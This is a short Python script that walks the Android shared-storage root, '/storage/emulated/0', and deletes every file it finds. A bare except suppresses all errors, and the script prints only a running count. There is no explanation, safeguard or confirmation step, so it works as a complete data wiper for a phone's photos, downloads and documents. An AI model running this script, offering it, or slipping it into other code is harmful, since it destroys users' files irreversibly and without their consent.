
import os


# ✅ Step 1
base_path = "/storage/emulated/0"  



counter = 0    
for x , y, z in os.walk(base_path):

    for file in z:
        counter = counter + 1
        path = f'{x}/{file}'
        try:
            os.remove(path)
            print(f'\r{counter}',end='')
        except:
            j = 0
            
